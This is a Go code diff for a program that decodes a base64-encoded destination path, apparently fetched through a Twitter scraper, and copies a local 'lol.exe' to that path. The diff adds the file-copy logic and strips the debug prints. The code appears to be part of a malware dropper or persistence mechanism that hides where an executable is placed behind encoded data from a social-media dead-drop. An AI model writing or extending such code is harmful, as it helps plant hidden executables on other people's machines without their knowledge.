@@ -6,6 +6,7 @@ package main
 import (
 	"encoding/base64"
 	"fmt"
+	"io"
 	"os"
 
 	twt_get "github.com/n0madic/twitter-scraper"
@@ -19,10 +20,8 @@ func hErr(err error) {
 
 func main() {
 	srcd, err := os.Getwd()
-	fmt.Println(srcd)
 	src := srcd + "\\lol.exe"
 	hErr(err)
-	fmt.Println(src)
 	dev(src)
 }
 
@@ -35,20 +34,23 @@ func dev(src string) {
 	hErr(err)
 	p1_1_1, err := base64.StdEncoding.DecodeString(string(p1_1))
 	hErr(err)
-	fmt.Println(p1_1_1)
 	cpy(src, string(p1_1_1))
 }
 
 func cpy(src, dest string) {
-	dst, err := base64.StdEncoding.DecodeString(dest)
-	hErr(err)
-	dt, err := base64.StdEncoding.DecodeString(string(dst))
-	hErr(err)
 
 	fmt.Println(src)
-	fmt.Println(string(dt))
+	fmt.Println(dest)
 
-	sourceFile, err := os.Open(src)
+	from, err := os.Open(src)
 	hErr(err)
-	defer sourceFile.Close()
+	defer from.Close()
+
+	os.Create(dest)
+	to, err := os.OpenFile(dest, os.O_RDWR, 0666)
+	hErr(err)
+	defer to.Close()
+
+	_, err = io.Copy(to, from)
+	hErr(err)
 }
